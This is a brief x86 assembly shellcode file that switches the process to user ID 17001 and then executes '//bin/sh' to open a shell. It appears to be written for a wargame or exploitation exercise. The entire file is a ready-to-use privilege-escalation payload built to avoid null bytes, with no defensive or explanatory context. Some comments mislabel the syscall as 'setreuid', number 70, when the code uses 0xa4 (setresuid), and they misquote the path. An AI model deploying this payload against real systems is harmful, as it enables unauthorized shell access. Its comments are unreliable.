section .data

section .text
global main

main:
	xor eax,eax;
	mov al,0xa4; #sycall 70, setreuid
	xor ebx,ebx;
	mov bl,0x42;
	shl ebx,8; #ebx = 0x4200
	mov bl,0x69; #ebx = 0x4269
	mov ecx,ebx; #ebx = 17001, ecx = 17001
	mov edx,ebx;
	int 0x80; #setreuid(17001,17001)
	xor eax,eax;
	mov al,0xb;
	xor edx,edx;
	push edx;
	push 0x68732f6e;
	push 0x69622f2f;
	mov ebx,esp;
	mov ecx,edx;
	int 0x80; #execve("bin/sh",0,0)
	
